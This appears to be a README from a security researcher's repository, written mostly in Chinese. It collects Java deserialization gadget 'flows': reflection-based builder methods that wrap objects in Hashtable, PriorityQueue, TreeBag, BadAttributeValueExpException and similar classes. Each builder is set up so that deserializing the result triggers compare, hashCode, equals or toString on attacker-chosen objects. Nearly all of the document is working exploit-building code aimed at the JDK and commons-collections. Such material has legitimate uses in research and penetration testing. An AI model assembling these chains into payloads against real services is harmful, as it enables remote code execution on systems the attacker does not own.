# java_gadget_flow
一些总结出来的gadget的flow，后续合适和加入新的flow

### Hashtable->compare

```java
    public static Hashtable<Object, Object> table2compare(Comparator o1, Object o2) throws Exception {
        TreeMap<Object,Object> m1 = new TreeMap<>(o1);
        Utils. setFieldValue(m1, "size", 1);
        Utils.setFieldValue(m1, "modCount", 1);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object node = nodeCons.newInstance(o2, 1, null);
        Utils.setFieldValue(m1, "root", node);

        TreeMap<Object,Object> m2 = new TreeMap<>(o1);
        Utils.setFieldValue(m2, "size", 1);
        Utils.setFieldValue(m2, "modCount", 1);
        Utils.setFieldValue(m2, "root", node);
        Hashtable hashtable = new Hashtable();
        Utils.setFieldValue(hashtable,"count",2);
        Class<?> nodeD;
        nodeD = Class.forName("java.util.Hashtable$Entry");

        Constructor<?> nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);
        nodeDons.setAccessible(true);
        Object tbl = Array.newInstance(nodeD, 2);
        Array.set(tbl, 0, nodeDons.newInstance(0, m1, "Unam4", null));
        Array.set(tbl, 1, nodeDons.newInstance(0, m2, "Springkill", null));
        Utils.setFieldValue(hashtable, "table", tbl);
        return hashtable;
    }
```



### annotationhander ->compare. (<=8U70,不能用来触发cb,methodname不可控)

```java
 public static Object annotationhander2compare(Map o) throws Exception {
        Class<?> AnnotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> Anotationdeclared =
                AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        Anotationdeclared.setAccessible(true);
        InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Override.class, o);
        Map Mapproxy =(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(),new Class[]{Map.class}, h);
        Object o1 =Anotationdeclared.newInstance(Override.class, Mapproxy);
        return o1;
    }
```



###  treebag—>compare

```java
    //cc 依赖
    public static TreeBag treebag2compare(Comparator o, Object o2) throws Exception {
        TreeBag treeBag = new TreeBag();
        TreeMap<Object,Object> m = new TreeMap<>();
        Object num = Utils.createWithoutConstructor("org.apache.commons.collections.bag.AbstractMapBag$MutableInteger");
        Utils.setFieldValue(m, "comparator", o);
        Utils.setFieldValue(m, "size", 1);
        Utils.setFieldValue(m, "modCount", 1);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object node = nodeCons.newInstance(o2, num, null);
//        Object right = nodeCons.newInstance(o2, new Object[0], node);
//        setFieldValue(node, "right", right);
        Utils.setFieldValue(m, "root", node);
        Utils.setFieldValue(treeBag,"map",m);
        return treeBag;
    }
```

### EventListenerList -》tostring

```
public static  EventListenerList  eventtostring(Object o) throws Exception{
    Reflections(utils.class);
    EventListenerList list = new EventListenerList();
    UndoManager manager = new UndoManager();
    Vector vector = (Vector) getFieldValue(manager, "edits");
    vector.add(o);
    setFieldValue(list, "listenerList", new Object[] { Map.class, manager });
    return list;
}
```


### concurrentmap->compare

```java
    public static ConcurrentHashMap<Object, Object> concurrentmap2compare(Comparator o1, Object o2) throws Exception {
      	//避免put触发
        TreeMap<Object,Object> m = new TreeMap<>(o1);
        Utils.setFieldValue(m, "size", 1);
        Utils.setFieldValue(m, "modCount", 1);
        Class<?> nodeD = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeDons = nodeD.getDeclaredConstructor(Object.class, Object.class, nodeD);
        nodeDons.setAccessible(true);
        Object node = nodeDons.newInstance(o2, 1, null);
        Utils.setFieldValue(m, "root", node);

        TreeMap<Object,Object> m2 = new TreeMap<>(o1);
        Utils.setFieldValue(m2, "size", 1);
        Utils.setFieldValue(m2, "modCount", 1);
        Utils.setFieldValue(m2, "root", node);
        ConcurrentHashMap<Object, Object> s = new ConcurrentHashMap<>();
        Utils.setFieldValue(s, "sizeCtl", 2);
        Class<?> nodeB;
        try {
            nodeB = Class.forName("java.util.concurrent.ConcurrentHashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeB = Class.forName("java.util.concurrent.HashMap$Node");
        }
        Constructor<?> nodeBons = nodeB.getDeclaredConstructor(int.class, Object.class, Object.class, nodeB);
        nodeBons.setAccessible(true);
        Object tbl = Array.newInstance(nodeB, 2);
        Array.set(tbl, 0, nodeBons.newInstance(0, m, "unam4", null));
        Array.set(tbl, 1, nodeBons.newInstance(0, m2, "springkill", null));
        Utils.setFieldValue(s, "table", tbl);
        return s;
    }
    
```



### PriorityQueue->compare

```java
    public static PriorityQueue priorityqueue2compare(Comparator o1, Object o2) throws Exception {
        PriorityQueue queue = new PriorityQueue(1);
        Utils.setFieldValue(queue, "size", 2);
        Utils.setFieldValue(queue, "comparator", o1);
        Utils.setFieldValue(queue, "queue", new Object[]{o2,1});
        return queue;
    }
```





### dualTreeBidiMap->compare

```java
 public static DualTreeBidiMap dualTreeBidiMap2compare(Comparator o1, Object o2) throws Exception {
        DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap();
        Map[] mapArray = new HashMap[1];
        mapArray[0] = new HashMap();
        //避免put时触发hashcode问题
        Class<?> nodeD;
        try {
            nodeD = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeD = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);
        nodeDons.setAccessible(true);
        Object tbl = Array.newInstance(nodeD, 1);
        Array.set(tbl, 0, nodeDons.newInstance(0, o2, o2, null));
        Utils.setFieldValue( mapArray[0], "size", 1);
        Utils.setFieldValue(mapArray[0], "table", tbl);
        Utils.setFieldValue(dualTreeBidiMap, "comparator", o1);
        Utils.setFieldValue(dualTreeBidiMap, "maps", mapArray);
        return dualTreeBidiMap;
    }
```





### hashed->hashcode

```java
    public static Map hashedMap2hashcode (Object o) throws Exception {
      //避免new的时候直接触发
        Map s= (Map) Utils.createWithoutConstructor("org.apache.commons.collections.map.HashedMap");
        Class<?> nodeB;
        nodeB = Class.forName("org.apache.commons.collections.map.AbstractHashedMap$HashEntry");

        Constructor<?> nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeB, 1);
        Array.set(tbl, 0, nodeCons.newInstance(null,0, o, o));
        Utils.setFieldValue(s, "data", tbl);
        Utils.setFieldValue(s, "size", 1);
        return s;
    }
```





### CaseInsensitiveMap->tostring

本来想藏一藏(但是有大哥已经写在工具里了)，算了公开了

```java
    public static Map caseInsensitiveMap2string (Object o) throws Exception {
        Map s= (Map) Utils.createWithoutConstructor("org.apache.commons.collections.map.CaseInsensitiveMap");
        Class<?> nodeB;
        nodeB = Class.forName("org.apache.commons.collections.map.AbstractHashedMap$HashEntry");

        Constructor<?> nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeB, 1);
        Array.set(tbl, 0, nodeCons.newInstance(null,0, o, o));
        Utils.setFieldValue(s, "data", tbl);
        Utils.setFieldValue(s, "size", 1);
        return s;
    }
```



### dualHashBidiMap->hashcode

```java
    public static DualHashBidiMap dualHashBidiMap2hashcode(Object o) throws Exception{
        DualHashBidiMap dualHashBidiMap = new DualHashBidiMap();
        Map[] mapArray = new HashMap[1];
        mapArray[0] = new HashMap();
        //避免put时触发hashcode问题
        Class<?> nodeD;
        try {
            nodeD = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeD = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);
        nodeDons.setAccessible(true);
        Object tbl = Array.newInstance(nodeD, 1);
        Array.set(tbl, 0, nodeDons.newInstance(0, o, "unam4", null));
        Utils.setFieldValue( mapArray[0], "size", 1);
        Utils.setFieldValue(mapArray[0], "table", tbl);
        Utils.setFieldValue(dualHashBidiMap, "maps", mapArray);
        return dualHashBidiMap;
    }
```





### hashmap->equals

```java
public static HashMap<Object, Object> map2equals(Object o, Object o2) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Utils.setFieldValue(s, "size", 2);
        Class<?> nodeD;
        try {
            nodeD = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeD = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);
        nodeDons.setAccessible(true);
        Object tbl = Array.newInstance(nodeD, 2);
        Array.set(tbl, 0, nodeDons.newInstance(0, o, "key1", null));
        Array.set(tbl, 1, nodeDons.newInstance(0, o2, "key2", null));
        Utils.setFieldValue(s, "table", tbl);
        return s;
    }
```



### hashmap->compare

```java
    public static HashMap<Object, Object> map2compare(Comparator o1, Object o2) throws Exception {
        TreeMap<Object,Object> m1 = new TreeMap<>(o1);
        Utils. setFieldValue(m1, "size", 1);
        Utils.setFieldValue(m1, "modCount", 1);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object node = nodeCons.newInstance(o2, 1, null);
        Utils.setFieldValue(m1, "root", node);

        TreeMap<Object,Object> m2 = new TreeMap<>(o1);
        Utils.setFieldValue(m2, "size", 1);
        Utils.setFieldValue(m2, "modCount", 1);
        Utils.setFieldValue(m2, "root", node);
        HashMap<Object, Object> s = new HashMap<>();
        Utils.setFieldValue(s, "size", 2);
        Class<?> nodeD;
        try {
            nodeD = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeD = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);
        nodeDons.setAccessible(true);
        Object tbl = Array.newInstance(nodeD, 2);
        Array.set(tbl, 0, nodeDons.newInstance(0, m1, "key1", null));
        Array.set(tbl, 1, nodeDons.newInstance(0, m2, "key2", null));
        Utils.setFieldValue(s, "table", tbl);
        return s;
    }
```





### hashtable->tostring

```java
 public static Hashtable table2tostring(Object o) throws Exception{
        Class node = Class.forName("java.util.HashMap$Node");
        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        constructor.setAccessible(true);
        // 避免put时，触发hashcode。
        Map tHashMap1 = (Map) Utils.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Map tHashMap2 = (Map) Utils.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Object tnode1 = constructor.newInstance(0, o,null, null);
        Utils.setFieldValue(tHashMap1, "size", 2);
        Object tarr = Array.newInstance(node, 2);
        Array.set(tarr, 0, tnode1);
        Array.set(tarr, 1, tnode1);
        Utils.setFieldValue(tHashMap1, "table", tarr);
        Object tnode2 = constructor.newInstance(0, o, null, null);
        Utils.setFieldValue(tHashMap2, "size", 2);
        Object tarr2 = Array.newInstance(node, 2);
        Array.set(tarr2, 0, tnode2);
        Array.set(tarr2, 1, tnode2);
        Utils.setFieldValue(tHashMap2, "table", tarr2);
        Utils.setFieldValue(tHashMap1,"loadFactor",1);
        Utils.setFieldValue(tHashMap2,"loadFactor",1);

        // 避免put时触发hashcode
        Hashtable hashtable = new Hashtable();
        Utils.setFieldValue(hashtable,"count",2);
        Class<?> nodeE;
        nodeE = Class.forName("java.util.Hashtable$Entry");

        Constructor<?> nodeEons = nodeE.getDeclaredConstructor(int.class, Object.class, Object.class, nodeE);
        nodeEons.setAccessible(true);
        Object tbl = Array.newInstance(nodeE, 2);
        Array.set(tbl, 0, nodeEons.newInstance(0, tHashMap1, "Unam4", null));
        Array.set(tbl, 1, nodeEons.newInstance(0, tHashMap2, "Springkill", null));
        Utils.setFieldValue(hashtable, "table", tbl);
//        hashtable.put(tHashMap1,"Unam4");
//        hashtable.put(tHashMap2,"SpringKill");
//        tHashMap1.put(o, null);
//        tHashMap2.put(o, null);
        return hashtable;
    }
```





### hashmap->tostring

```java
 public static HashMap map2tostring(Object o1, Object o2) throws Exception{
        //避免put时触发hashcode
        Class node = Class.forName("java.util.HashMap$Node");
        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        constructor.setAccessible(true);
        Map tHashMap1 = (Map) Utils.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Map tHashMap2 = (Map) Utils.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Object tnode1 = constructor.newInstance(0, o1,null, null);
        Utils.setFieldValue(tHashMap1, "size", 1);
        Object tarr = Array.newInstance(node, 1);
        Array.set(tarr, 0, tnode1);
        Utils.setFieldValue(tHashMap1, "table", tarr);
        Object tnode2 = constructor.newInstance(0, o2, null, null);
        Utils.setFieldValue(tHashMap2, "size", 1);
        Object tarr2 = Array.newInstance(node, 1);
        Array.set(tarr2, 0, tnode2);
        Utils.setFieldValue(tHashMap2, "table", tarr2);
        Utils.setFieldValue(tHashMap1,"loadFactor",1);
        Utils.setFieldValue(tHashMap2,"loadFactor",1);

        HashMap hashMap = new HashMap();
        Object node1 = constructor.newInstance(0, tHashMap1, null, null);
        Object node2 = constructor.newInstance(0, tHashMap2, null, null);
        Utils.setFieldValue(hashMap, "size", 2);
        Object arr = Array.newInstance(node, 2);
        Array.set(arr, 0, node1);
        Array.set(arr, 1, node2);
        Utils.setFieldValue(hashMap, "table", arr);
        return hashMap;
    }
```





### hashtable->equals

```java
    public static Hashtable table2equals(Object o, Object o2) throws Exception{

        Hashtable hashtable = new Hashtable();
        Utils.setFieldValue(hashtable,"count",2);
        Class<?> nodeD;
        nodeD = Class.forName("java.util.Hashtable$Entry");

        Constructor<?> nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);
        nodeDons.setAccessible(true);
        Object tbl = Array.newInstance(nodeD, 2);
        Array.set(tbl, 0, nodeDons.newInstance(0, o, "Unam4", null));
        Array.set(tbl, 1, nodeDons.newInstance(0, o2, "Springkill", null));
        Utils.setFieldValue(hashtable, "table", tbl);
        return hashtable;
    }
```



### concurrentmap->equals

```java
    public static ConcurrentHashMap<Object, Object> concurrentmap2equals(Object o, Object o2) throws Exception {
        ConcurrentHashMap<Object, Object> s = new ConcurrentHashMap<>();
        Utils.setFieldValue(s, "sizeCtl", 2);
        Class<?> nodeD;
        try {
            nodeD = Class.forName("java.util.concurrent.ConcurrentHashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeD = Class.forName("java.util.concurrent.ConcurrentHashMap$Node");
        }
        Constructor<?> nodeDons = nodeD.getDeclaredConstructor(int.class, Object.class, Object.class, nodeD);
        nodeDons.setAccessible(true);
        Object tbl = Array.newInstance(nodeD, 2);
        Array.set(tbl, 0, nodeDons.newInstance(0, o, "zZ", null));
        Array.set(tbl, 1, nodeDons.newInstance(0, o2, "yy", null));
        Utils.setFieldValue(s, "table", tbl);
        return s;
    }
```



### HotSwappable->tostring

```java
    public static HashMap HotSwappabletostring(Object o1)throws Exception{
        Object xstring;
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(o1);
      //三个xstring都行，看谁顺眼用那个
        xstring = Utils.createWithoutConstructor("com.sun.org.apache.xpath.internal.objects.XStringForFSB");
        Utils.setFieldValue(xstring, "m_obj", "1");
        xstring = Utils.createWithoutConstructor("com.sun.org.apache.xpath.internal.objects.XStringForChars");
        Utils.setFieldValue(xstring, "m_obj", new char[5]);
        xstring = new XString(null);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(xstring);
        HashMap val = map2equals(hotSwappableTargetSource1, hotSwappableTargetSource2);
        return val;
    }
```





### badattribute->tostring

```java
    public static BadAttributeValueExpException  badattribute2tostring(Object o1)throws Exception{
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(new HashMap<>());
        Utils.setFieldValue(badAttributeValueExpException,"val",o1);
        return badAttributeValueExpException;
    }
```





### flat3Map->hashcode

```java
    public static Map  flat3Map2hashcode(Object o1)throws Exception{
        Map s= (Map) new Flat3Map();
        //避免构造函数触发
        Class<?> nodeB;
        nodeB = Class.forName("org.apache.commons.collections.map.AbstractHashedMap$HashEntry");
        HashedMap hashedMap = new HashedMap();
        Constructor<?> nodeCons = nodeB.getDeclaredConstructor(nodeB,int.class, Object.class, Object.class);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeB, 1);
        Array.set(tbl, 0, nodeCons.newInstance(null,0, o1, o1));
        Utils.setFieldValue(hashedMap, "data", tbl);
        Utils.setFieldValue(hashedMap, "size", 1);
        Utils.setFieldValue(s,"delegateMap",hashedMap);
        return s;
    }
```





### HotSwappable->compare

```java
    public static Hashtable HotSwappable2compare(Comparator o, Object o2)throws Exception{
        TreeMap<Object,Object> m1 = new TreeMap<>(o);
        Utils.setFieldValue(m1, "size", 1);
        Utils.setFieldValue(m1, "modCount", 1);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object node = nodeCons.newInstance(o2, 1, null);
        Utils.setFieldValue(m1, "root", node);

        TreeMap<Object,Object> m2 = new TreeMap<>(o);
        Utils.setFieldValue(m2, "size", 1);
        Utils.setFieldValue(m2, "modCount", 1);
        Utils.setFieldValue(m2, "root", node);
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(m1);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(m2);
        Hashtable hashtable = table2equals(hotSwappableTargetSource1, hotSwappableTargetSource2);
        return hashtable;
    }
```




## 原文链接
https://unam4.github.io/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/
